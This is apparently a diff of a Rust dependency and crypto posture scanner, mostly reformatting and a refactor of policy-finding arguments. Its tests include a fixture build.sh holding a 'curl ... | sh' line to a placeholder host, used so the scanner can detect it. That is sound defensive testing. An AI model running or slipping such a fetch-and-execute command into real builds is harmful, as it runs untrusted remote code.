@@ -17,14 +17,18 @@ use crate::{
 const SCANNER_NAME: &str = "fulcr-native-scanner/0.1";
 const DEFAULT_MAX_FILE_BYTES: u64 = 1024 * 1024;
 
-pub async fn scan_recipe(recipe: &Recipe, request: ScanRequest, work_dir: &Path) -> anyhow::Result<ScanReport> {
+pub async fn scan_recipe(
+    recipe: &Recipe,
+    request: ScanRequest,
+    work_dir: &Path,
+) -> anyhow::Result<ScanReport> {
     let recipe_clone = recipe.clone();
     let work_dir_clone = work_dir.to_path_buf();
     let mut report = tokio::task::spawn_blocking(move || {
         scan_recipe_blocking(&recipe_clone, request, &work_dir_clone)
     })
-        .await
-        .context("scanner worker failed")??;
+    .await
+    .context("scanner worker failed")??;
 
     enrich_report_with_osv(recipe, &mut report).await;
 
@@ -62,23 +66,25 @@ async fn enrich_report_with_osv(recipe: &Recipe, report: &mut ScanReport) {
         .timeout(std::time::Duration::from_secs(10))
         .build()
         .unwrap_or_else(|_| reqwest::Client::new());
-        
+
     let mut osv_failed = false;
 
     for (query_chunk, component_chunk) in queries.chunks(1000).zip(mapped_components.chunks(1000)) {
         let request = serde_json::json!({ "queries": query_chunk });
-        
-        let response = match client.post("https://api.osv.dev/v1/querybatch")
+
+        let response = match client
+            .post("https://api.osv.dev/v1/querybatch")
             .json(&request)
             .send()
-            .await {
-                Ok(resp) => resp,
-                Err(err) => {
-                    tracing::warn!("OSV logic failed: {}", err);
-                    osv_failed = true;
-                    continue;
-                }
-            };
+            .await
+        {
+            Ok(resp) => resp,
+            Err(err) => {
+                tracing::warn!("OSV logic failed: {}", err);
+                osv_failed = true;
+                continue;
+            }
+        };
 
         let mut data = match response.json::<serde_json::Value>().await {
             Ok(data) => data,
@@ -88,41 +94,49 @@ async fn enrich_report_with_osv(recipe: &Recipe, report: &mut ScanReport) {
                 continue;
             }
         };
-        
+
         let Some(results) = data.get_mut("results").and_then(|v| v.as_array_mut()) else {
             osv_failed = true;
             continue;
         };
-        
+
         for (i, result) in results.iter().enumerate() {
             let Some(vulns) = result.get("vulns").and_then(|v| v.as_array()) else {
                 continue;
             };
-            
+
             for vuln in vulns {
-                let Some(id) = vuln.get("id").and_then(|id| id.as_str()) else { continue };
+                let Some(id) = vuln.get("id").and_then(|id| id.as_str()) else {
+                    continue;
+                };
                 let component = &component_chunk[i];
                 let vulnerability = id.to_string();
-                
+
                 report.findings.push(ScanFinding {
                     severity: FindingSeverity::High,
                     category: "known-vulnerability".to_string(),
-                    message: format!("component {} has a known vulnerability: {}", component.name, vulnerability),
+                    message: format!(
+                        "component {} has a known vulnerability: {}",
+                        component.name, vulnerability
+                    ),
                     evidence: component.evidence.clone(),
                 });
-                
+
                 report.vex_candidates.push(VexCandidate {
                     vulnerability: vulnerability.clone(),
                     status: VexStatus::UnderInvestigation,
                     component: component.name.clone(),
                     justification: "requires_triage".to_string(),
-                    detail: format!("Vulnerability {} detected in {} via OSV database.", vulnerability, component.name),
+                    detail: format!(
+                        "Vulnerability {} detected in {} via OSV database.",
+                        vulnerability, component.name
+                    ),
                     evidence: component.evidence.clone(),
                 });
             }
         }
     }
-    
+
     if osv_failed {
         report.findings.push(ScanFinding {
             severity: FindingSeverity::High,
@@ -131,7 +145,7 @@ async fn enrich_report_with_osv(recipe: &Recipe, report: &mut ScanReport) {
             evidence: "api.osv.dev".to_string(),
         });
     }
-    
+
     report.status = if report.findings.is_empty() {
         ScanStatus::Completed
     } else {
@@ -139,11 +153,20 @@ async fn enrich_report_with_osv(recipe: &Recipe, report: &mut ScanReport) {
     };
     report.summary.findings_detected = report.findings.len();
     report.summary.vex_candidates_detected = report.vex_candidates.len();
-    report.sbom = build_sbom(recipe, &report.components, &report.findings, &report.created_at);
+    report.sbom = build_sbom(
+        recipe,
+        &report.components,
+        &report.findings,
+        &report.created_at,
+    );
     report.cbom = build_cbom(recipe, &report.crypto, &report.findings, &report.created_at);
 }
 
-fn scan_recipe_blocking(recipe: &Recipe, request: ScanRequest, work_dir: &Path) -> anyhow::Result<ScanReport> {
+fn scan_recipe_blocking(
+    recipe: &Recipe,
+    request: ScanRequest,
+    work_dir: &Path,
+) -> anyhow::Result<ScanReport> {
     let max_file_bytes = request.max_file_bytes.unwrap_or(DEFAULT_MAX_FILE_BYTES);
 
     match request.mode {
@@ -358,11 +381,22 @@ fn is_documentation_file(path: &str, file_name: &str) -> bool {
     let lower_path = path.to_ascii_lowercase();
     matches!(
         lower_name.as_str(),
-        "readme" | "readme.md" | "readme.txt" | "readme.rst"
-            | "license" | "license.md" | "license.txt"
-            | "notice" | "notice.md" | "notice.txt"
-            | "changelog" | "changelog.md" | "changes.md"
-            | "contributing.md" | "code_of_conduct.md" | "security.md"
+        "readme"
+            | "readme.md"
+            | "readme.txt"
+            | "readme.rst"
+            | "license"
+            | "license.md"
+            | "license.txt"
+            | "notice"
+            | "notice.md"
+            | "notice.txt"
+            | "changelog"
+            | "changelog.md"
+            | "changes.md"
+            | "contributing.md"
+            | "code_of_conduct.md"
+            | "security.md"
     ) || lower_path.starts_with("docs/")
         || lower_path.contains("/docs/")
         || lower_name.ends_with(".md")
@@ -422,8 +456,7 @@ fn parse_cargo_lock(text: &str, evidence: &str, scanner: &mut ScannerState) {
                 add_sbom_policy_finding(
                     scanner,
                     FindingSeverity::Medium,
-                    "sbom-missing-integrity",
-                    "fulcr-SBOM-MISSING-INTEGRITY",
+                    ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                     &name,
                     format!("Cargo package {name} has no checksum in Cargo.lock"),
                     evidence.to_string(),
@@ -510,8 +543,7 @@ fn parse_cargo_dependency(
                 add_sbom_policy_finding(
                     scanner,
                     FindingSeverity::High,
-                    "sbom-unpinned-dependency",
-                    "fulcr-SBOM-UNPINNED-DEPENDENCY",
+                    ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                     name,
                     format!("Cargo dependency {name} in {section} has no version pin"),
                     evidence.to_string(),
@@ -536,8 +568,7 @@ fn parse_cargo_dependency(
             add_sbom_policy_finding(
                 scanner,
                 FindingSeverity::High,
-                "sbom-unpinned-dependency",
-                "fulcr-SBOM-UNPINNED-DEPENDENCY",
+                ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                 name,
                 format!(
                     "Cargo dependency {name} in {section} has an unsupported declaration shape"
@@ -609,8 +640,7 @@ fn parse_package_json(text: &str, evidence: &str, scanner: &mut ScannerState) {
                     add_sbom_policy_finding(
                         scanner,
                         FindingSeverity::High,
-                        "sbom-unpinned-dependency",
-                        "fulcr-SBOM-UNPINNED-DEPENDENCY",
+                        ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                         name,
                         format!("dependency {name} in {field} does not use a string version spec"),
                         evidence.to_string(),
@@ -635,8 +665,7 @@ fn parse_package_json(text: &str, evidence: &str, scanner: &mut ScannerState) {
                 add_sbom_policy_finding(
                     scanner,
                     FindingSeverity::High,
-                    "sbom-lifecycle-script",
-                    "fulcr-SBOM-LIFECYCLE-SCRIPT",
+                    ("sbom-lifecycle-script", "fulcr-SBOM-LIFECYCLE-SCRIPT"),
                     name,
                     format!("npm lifecycle script {name} requires explicit approval"),
                     format!("{evidence}#scripts.{name}"),
@@ -650,8 +679,10 @@ fn parse_package_json(text: &str, evidence: &str, scanner: &mut ScannerState) {
                 add_sbom_policy_finding(
                     scanner,
                     FindingSeverity::High,
-                    "sbom-suspicious-package-script",
-                    "fulcr-SBOM-SUSPICIOUS-PACKAGE-SCRIPT",
+                    (
+                        "sbom-suspicious-package-script",
+                        "fulcr-SBOM-SUSPICIOUS-PACKAGE-SCRIPT",
+                    ),
                     name,
                     format!("npm script {name} references credential, token, registry, or publish behavior"),
                     format!("{evidence}#scripts.{name}"),
@@ -716,8 +747,7 @@ fn parse_pnpm_lock(text: &str, evidence: &str, scanner: &mut ScannerState) {
                 add_sbom_policy_finding(
                     scanner,
                     FindingSeverity::High,
-                    "sbom-missing-integrity",
-                    "fulcr-SBOM-MISSING-INTEGRITY",
+                    ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                     &name,
                     format!("pnpm package {name} is missing a lockfile integrity hash"),
                     package_evidence.clone(),
@@ -822,8 +852,7 @@ fn parse_pom_xml(text: &str, evidence: &str, digest: Option<String>, scanner: &m
             add_sbom_policy_finding(
                 scanner,
                 FindingSeverity::Medium,
-                "sbom-unpinned-dependency",
-                "fulcr-SBOM-UNPINNED-DEPENDENCY",
+                ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
                 &name,
                 format!("Maven dependency {name} uses a property-substituted version"),
                 evidence.to_string(),
@@ -1242,8 +1271,7 @@ fn flush_cargo_package(
             add_sbom_policy_finding(
                 scanner,
                 FindingSeverity::Medium,
-                "sbom-missing-integrity",
-                "fulcr-SBOM-MISSING-INTEGRITY",
+                ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
                 &name,
                 format!("Cargo package {name} has no checksum in Cargo.lock"),
                 evidence.to_string(),
@@ -1264,8 +1292,7 @@ fn enforce_npm_lock_policy(
         add_sbom_policy_finding(
             scanner,
             FindingSeverity::High,
-            "sbom-missing-integrity",
-            "fulcr-SBOM-MISSING-INTEGRITY",
+            ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
             name,
             format!("npm package {name} is missing a lockfile integrity hash"),
             evidence.to_string(),
@@ -1281,8 +1308,7 @@ fn enforce_npm_lock_policy(
         add_sbom_policy_finding(
             scanner,
             FindingSeverity::High,
-            "sbom-lifecycle-script",
-            "fulcr-SBOM-LIFECYCLE-SCRIPT",
+            ("sbom-lifecycle-script", "fulcr-SBOM-LIFECYCLE-SCRIPT"),
             name,
             format!("npm package {name} declares an install lifecycle script in the lockfile"),
             evidence.to_string(),
@@ -1307,8 +1333,7 @@ fn enforce_dependency_spec_policy(
         add_sbom_policy_finding(
             scanner,
             FindingSeverity::High,
-            "sbom-unpinned-dependency",
-            "fulcr-SBOM-UNPINNED-DEPENDENCY",
+            ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
             name,
             format!("{ecosystem} dependency {name} in {field} is not pinned exactly: {spec}"),
             evidence.to_string(),
@@ -1329,8 +1354,7 @@ fn enforce_python_requirement_policy(
         add_sbom_policy_finding(
             scanner,
             FindingSeverity::High,
-            "sbom-unpinned-dependency",
-            "fulcr-SBOM-UNPINNED-DEPENDENCY",
+            ("sbom-unpinned-dependency", "fulcr-SBOM-UNPINNED-DEPENDENCY"),
             name,
             format!("Python requirement {name} is not pinned with =="),
             evidence.to_string(),
@@ -1341,8 +1365,7 @@ fn enforce_python_requirement_policy(
         add_sbom_policy_finding(
             scanner,
             FindingSeverity::Medium,
-            "sbom-missing-integrity",
-            "fulcr-SBOM-MISSING-INTEGRITY",
+            ("sbom-missing-integrity", "fulcr-SBOM-MISSING-INTEGRITY"),
             name,
             format!("Python requirement {name} lacks a sha256 hash pin"),
             evidence.to_string(),
@@ -1392,8 +1415,7 @@ fn enforce_dependency_source_policy(
         add_sbom_policy_finding(
             scanner,
             severity,
-            "sbom-untrusted-source",
-            "fulcr-SBOM-UNTRUSTED-SOURCE",
+            ("sbom-untrusted-source", "fulcr-SBOM-UNTRUSTED-SOURCE"),
             name,
             format!("{ecosystem} dependency {name} uses {message}: {spec}"),
             evidence.to_string(),
@@ -1405,13 +1427,13 @@ fn enforce_dependency_source_policy(
 fn add_sbom_policy_finding(
     scanner: &mut ScannerState,
     severity: FindingSeverity,
-    category: &str,
-    vulnerability: &str,
+    policy: (&str, &str),
     component: &str,
     message: String,
     evidence: String,
     justification: &str,
 ) {
+    let (category, vulnerability) = policy;
     let requires_triage = matches!(severity, FindingSeverity::High | FindingSeverity::Critical);
     scanner.findings.push(ScanFinding {
         severity,
@@ -1563,9 +1585,9 @@ fn is_exact_version_spec(spec: &str) -> bool {
     // canonical extension to MAJOR.MINOR.0. Pure integers like "1" are still rejected
     // because they map to caret ranges in most ecosystems.
     if lower.chars().filter(|character| *character == '.').count() == 1
-        && lower
-            .split('.')
-            .all(|part| !part.is_empty() && part.chars().all(|character| character.is_ascii_digit()))
+        && lower.split('.').all(|part| {
+            !part.is_empty() && part.chars().all(|character| character.is_ascii_digit())
+        })
     {
         return semver::Version::parse(&format!("{lower}.0")).is_ok();
     }
@@ -1723,7 +1745,6 @@ fn looks_binary(bytes: &[u8]) -> bool {
     bytes.iter().take(1024).any(|byte| *byte == 0)
 }
 
-
 #[cfg(unix)]
 fn is_executable(metadata: &fs::Metadata) -> bool {
     use std::os::unix::fs::PermissionsExt;
@@ -1786,7 +1807,10 @@ mod tests {
     async fn scanner_detects_components_crypto_and_suspicious_scripts() {
         let temp = tempfile::tempdir().unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("Cargo.lock"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("Cargo.lock"),
             r#"
 [[package]]
 name = "serde"
@@ -1794,13 +1818,26 @@ version = "1.0.0"
 "#,
         )
         .unwrap();
-        fs::write(fs::canonicalize(temp.path()).unwrap().as_path().join("tls.conf"), "min_protocol = TLSv1.0\n").unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("build.sh"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("tls.conf"),
+            "min_protocol = TLSv1.0\n",
+        )
+        .unwrap();
+        fs::write(
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("build.sh"),
             "curl https://example.invalid/x | sh\n",
         )
         .unwrap();
-        let binary = fs::canonicalize(temp.path()).unwrap().as_path().join("tool.bin");
+        let binary = fs::canonicalize(temp.path())
+            .unwrap()
+            .as_path()
+            .join("tool.bin");
         fs::write(&binary, [0_u8, 1, 2, 3]).unwrap();
         let mut permissions = fs::metadata(&binary).unwrap().permissions();
         permissions.set_mode(0o755);
@@ -1811,7 +1848,12 @@ version = "1.0.0"
             source: SourceRef {
                 repo: "https://example.invalid/service".to_string(),
                 revision: "abc123".to_string(),
-                path: Some(fs::canonicalize(temp.path()).unwrap().as_path().to_path_buf()),
+                path: Some(
+                    fs::canonicalize(temp.path())
+                        .unwrap()
+                        .as_path()
+                        .to_path_buf(),
+                ),
             },
             builder: BuilderRef {
                 kind: BuilderKind::Script,
@@ -1826,7 +1868,13 @@ version = "1.0.0"
         })
         .unwrap();
 
-        let report = scan_recipe(&recipe, ScanRequest::default(), fs::canonicalize(temp.path()).unwrap().as_path()).await.unwrap();
+        let report = scan_recipe(
+            &recipe,
+            ScanRequest::default(),
+            fs::canonicalize(temp.path()).unwrap().as_path(),
+        )
+        .await
+        .unwrap();
 
         assert!(report
             .components
@@ -1849,7 +1897,10 @@ version = "1.0.0"
     #[tokio::test]
     async fn scanner_reconstructs_docker_archive_rootfs() {
         let temp = tempfile::tempdir().unwrap();
-        let image_dir = fs::canonicalize(temp.path()).unwrap().as_path().join("image");
+        let image_dir = fs::canonicalize(temp.path())
+            .unwrap()
+            .as_path()
+            .join("image");
         fs::create_dir_all(&image_dir).unwrap();
 
         let layer_path = image_dir.join("layer.tar");
@@ -1876,7 +1927,10 @@ version = "1.0.0"
         )
         .unwrap();
 
-        let image_archive = fs::canonicalize(temp.path()).unwrap().as_path().join("image.tar");
+        let image_archive = fs::canonicalize(temp.path())
+            .unwrap()
+            .as_path()
+            .join("image.tar");
         {
             let file = fs::File::create(&image_archive).unwrap();
             let mut archive = tar::Builder::new(file);
@@ -1897,7 +1951,12 @@ version = "1.0.0"
             source: SourceRef {
                 repo: "https://example.invalid/service".to_string(),
                 revision: "abc123".to_string(),
-                path: Some(fs::canonicalize(temp.path()).unwrap().as_path().to_path_buf()),
+                path: Some(
+                    fs::canonicalize(temp.path())
+                        .unwrap()
+                        .as_path()
+                        .to_path_buf(),
+                ),
             },
             builder: BuilderRef {
                 kind: BuilderKind::Script,
@@ -1919,7 +1978,7 @@ version = "1.0.0"
                 path: Some(image_archive.clone()),
                 max_file_bytes: None,
             },
-            fs::canonicalize(temp.path()).unwrap().as_path()
+            fs::canonicalize(temp.path()).unwrap().as_path(),
         )
         .await
         .unwrap();
@@ -1936,7 +1995,10 @@ version = "1.0.0"
     async fn scanner_enforces_sbom_and_cbom_posture_controls() {
         let temp = tempfile::tempdir().unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("package.json"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("package.json"),
             r#"{
   "dependencies": {
     "left-pad": "^1.3.0",
@@ -1950,7 +2012,10 @@ version = "1.0.0"
         )
         .unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("package-lock.json"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("package-lock.json"),
             r#"{
   "lockfileVersion": 3,
   "packages": {
@@ -1965,7 +2030,10 @@ version = "1.0.0"
         )
         .unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("crypto.conf"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("crypto.conf"),
             "openssl 1.1.1\nkeysize=1024\n-----BEGIN PRIVATE KEY-----\n",
         )
         .unwrap();
@@ -1975,7 +2043,12 @@ version = "1.0.0"
             source: SourceRef {
                 repo: "https://example.invalid/service".to_string(),
                 revision: "abc123".to_string(),
-                path: Some(fs::canonicalize(temp.path()).unwrap().as_path().to_path_buf()),
+                path: Some(
+                    fs::canonicalize(temp.path())
+                        .unwrap()
+                        .as_path()
+                        .to_path_buf(),
+                ),
             },
             builder: BuilderRef {
                 kind: BuilderKind::Script,
@@ -1990,7 +2063,13 @@ version = "1.0.0"
         })
         .unwrap();
 
-        let report = scan_recipe(&recipe, ScanRequest::default(), fs::canonicalize(temp.path()).unwrap().as_path()).await.unwrap();
+        let report = scan_recipe(
+            &recipe,
+            ScanRequest::default(),
+            fs::canonicalize(temp.path()).unwrap().as_path(),
+        )
+        .await
+        .unwrap();
         for category in [
             "sbom-unpinned-dependency",
             "sbom-untrusted-source",
@@ -2020,7 +2099,10 @@ version = "1.0.0"
     async fn scanner_uses_specialized_rust_manifest_and_pem_parsers() {
         let temp = tempfile::tempdir().unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("Cargo.toml"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("Cargo.toml"),
             r#"
 [package]
 name = "service"
@@ -2033,7 +2115,10 @@ remote-tool = { git = "https://example.invalid/remote-tool.git" }
         )
         .unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("pnpm-lock.yaml"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("pnpm-lock.yaml"),
             r#"
 lockfileVersion: '9.0'
 importers:
@@ -2052,7 +2137,10 @@ packages:
         )
         .unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("pom.xml"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("pom.xml"),
             r#"
 <project>
   <modelVersion>4.0.0</modelVersion>
@@ -2071,7 +2159,10 @@ packages:
         )
         .unwrap();
         fs::write(
-            fs::canonicalize(temp.path()).unwrap().as_path().join("developer.key"),
+            fs::canonicalize(temp.path())
+                .unwrap()
+                .as_path()
+                .join("developer.key"),
             "-----BEGIN PRIVATE KEY-----\nAQID\n-----END PRIVATE KEY-----\n",
         )
         .unwrap();
@@ -2081,7 +2172,12 @@ packages:
             source: SourceRef {
                 repo: "https://example.invalid/service".to_string(),
                 revision: "abc123".to_string(),
-                path: Some(fs::canonicalize(temp.path()).unwrap().as_path().to_path_buf()),
+                path: Some(
+                    fs::canonicalize(temp.path())
+                        .unwrap()
+                        .as_path()
+                        .to_path_buf(),
+                ),
             },
             builder: BuilderRef {
                 kind: BuilderKind::Script,
@@ -2096,7 +2192,13 @@ packages:
         })
         .unwrap();
 
-        let report = scan_recipe(&recipe, ScanRequest::default(), fs::canonicalize(temp.path()).unwrap().as_path()).await.unwrap();
+        let report = scan_recipe(
+            &recipe,
+            ScanRequest::default(),
+            fs::canonicalize(temp.path()).unwrap().as_path(),
+        )
+        .await
+        .unwrap();
 
         assert!(report
             .components
